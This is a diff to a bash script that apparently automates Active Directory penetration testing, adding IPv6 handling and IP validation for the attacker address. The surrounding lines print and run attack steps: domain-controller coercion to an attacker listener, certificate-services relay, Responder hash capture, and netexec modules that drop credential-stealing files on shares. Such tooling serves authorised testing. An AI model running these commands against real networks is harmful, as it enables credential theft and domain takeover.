@@ -22,7 +22,22 @@ if ! stat "${pass_wordlist}" >/dev/null 2>&1; then pass_wordlist="${wordlists_di
 user_wordlist="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
 if ! stat "${user_wordlist}" >/dev/null 2>&1; then user_wordlist="${wordlists_dir}/cirt-default-usernames.txt"; fi
 attacker_interface="eth0"
-attacker_IP=$(ip -f inet addr show ${attacker_interface} 2>/dev/null | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
+attacker_IPv4=$(ip -f inet addr show "${attacker_interface}" 2>/dev/null | sed -En -e 's/.*inet ([0-9.]+).*/\1/p' | head -1)
+attacker_IPv6=$(ip -f inet6 addr show "${attacker_interface}" 2>/dev/null | sed -En -e 's/.*inet6 ([0-9a-fA-F:]+).*/\1/p' | grep -vi '^fe80' | head -1)
+attacker_IP="${attacker_IPv4:-$attacker_IPv6}"
+
+is_valid_ip() {
+    local ip="$1"
+    [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] && return 0
+    [[ "$ip" =~ ^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$ ]] && return 0
+    return 1
+}
+
+bracket_ip() {
+    local ip="$1"
+    if [[ "$ip" == *:* ]]; then echo "[$ip]"; else echo "$ip"; fi
+}
+attacker_IP_bracket=$(bracket_ip "$attacker_IP")
 targets="DC"
 ldap_port="389"
 nullsess_bool=false
@@ -271,8 +286,11 @@ while test $# -gt 0; do
         args+=("$1")
         ;; #auto mode, disable interactive
     -I | --interface)
-        attacker_IP="$(ip -f inet addr show "${2}" | sed -En 's/.*inet ([0-9.]+).*/\1/p')"
         attacker_interface="${2}"
+        attacker_IPv4="$(ip -f inet addr show "${2}" 2>/dev/null | sed -En 's/.*inet ([0-9.]+).*/\1/p' | head -1)"
+        attacker_IPv6="$(ip -f inet6 addr show "${2}" 2>/dev/null | sed -En 's/.*inet6 ([0-9a-fA-F:]+).*/\1/p' | grep -vi '^fe80' | head -1)"
+        attacker_IP="${attacker_IPv4:-$attacker_IPv6}"
+        attacker_IP_bracket=$(bracket_ip "$attacker_IP")
         shift
         ;;
     -T | --targets)
@@ -2292,7 +2310,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}1. Start the relay server:${NC}"
             echo -e "${certipy} relay -target http://[ ${pki_servers_display} ] -ca \"${vulnca//SPACE/ }\" -template [ DomainController ]"
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l [ ${attacker_IP} ] --dc-ip ${dc_ip}"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${attacker_IP_bracket} --dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Authenticate using pfx of Domain Controller:${NC}"
             echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -2326,7 +2344,7 @@ adcs_vuln_parse() {
             echo -e "_OR_"
             echo -e "${certipy} relay -target rpc://[ ${pki_servers_display} ] -ca \"${vulnca//SPACE/ }\""
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${attacker_IP} --dc-ip $dc_ip"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${attacker_IP_bracket} --dc-ip $dc_ip"
         done
     fi
 
@@ -3450,7 +3468,7 @@ coerce_netexec() {
     done
     echo -e "${CYAN}[*] Example: 10.10.10.10 or kali@80 or localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ${NC}"
     set_attackerIP
-    run_command "${netexec} ${ne_verbose} smb ${target_coerce} ${argument_ne} -M coerce_plus -o LISTENER="${attacker_IP}" --log ${Vulnerabilities_dir}/ne_coerce_attack_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} smb ${target_coerce} ${argument_ne} -M coerce_plus -o LISTENER="${attacker_IP_bracket}" --log ${Vulnerabilities_dir}/ne_coerce_attack_output_${dc_domain}.txt" 2>&1
 
     echo -e ""
 }
@@ -3523,7 +3541,7 @@ coercer_check() {
             echo -e "${CYAN}1. Run responder on second terminal to capture hashes:${NC}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
             echo -e "sudo responder -I ${attacker_interface}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
             echo -e "${CYAN}2. Coerce target server:${NC}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l ${attacker_IP} --dc-ip ${dc_ip}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l ${attacker_IP_bracket} --dc-ip ${dc_ip}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
         fi
         echo -e ""
     fi
@@ -3556,7 +3574,7 @@ privexchange_check() {
                 read -rp ">> " target_exchange </dev/tty
             done
             set_attackerIP
-            run_command "${python3} ${privexchange} ${argument_privexchange} -ah ${attacker_IP} ${target_exchange}" | tee "${Vulnerabilities_dir}/privexchange_${dc_domain}.txt"
+            run_command "${python3} ${privexchange} ${argument_privexchange} -ah ${attacker_IP_bracket} ${target_exchange}" | tee "${Vulnerabilities_dir}/privexchange_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3658,9 +3676,9 @@ netexec_drop(){
         echo -e "${RED}Invalid share.${NC} Please specify share to mount:"
         read -rp ">> " drop_share </dev/tty
     done
-    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M drop-sc -o server=${attacker_IP} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
-    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M drop-library-ms -o server=${attacker_IP} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
-    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M slinky -o server=${attacker_IP} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M drop-sc -o server=${attacker_IP_bracket} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M drop-library-ms -o server=${attacker_IP_bracket} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} smb ${drop_target} ${argument_ne} -M slinky -o server=${attacker_IP_bracket} NAME=${drop_share} --log ${Vulnerabilities_dir}/ne_drop_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -5472,15 +5490,23 @@ set_attackerIP() {
     attacker_IP=""
     read -rp ">> " attacker_IP </dev/tty
 
-    while [[ -z "${attacker_IP}" ]]; do
+    while [[ -z "${attacker_IP}" ]] || ! is_valid_ip "${attacker_IP}"; do
         if [[ -z "${attacker_IP}" ]]; then
             echo -e "${RED}Empty input.${NC}"
+        else
+            echo -e "${RED}Invalid IP.${NC} Please specify a valid IPv4 or IPv6 address."
         fi
-        if [[ -z "${attacker_IP}" ]]; then
-            echo -e "${RED}Invalid IP.${NC} Please specify your attacker's IP."
-            read -rp ">> " attacker_IP </dev/tty
-        fi
+        read -rp ">> " attacker_IP </dev/tty
     done
+
+    if [[ "$attacker_IP" == *:* ]]; then
+        attacker_IPv6="$attacker_IP"
+        attacker_IPv4=""
+    else
+        attacker_IPv4="$attacker_IP"
+        attacker_IPv6=""
+    fi
+    attacker_IP_bracket=$(bracket_ip "$attacker_IP")
 }
 
 pkinit_auth() {
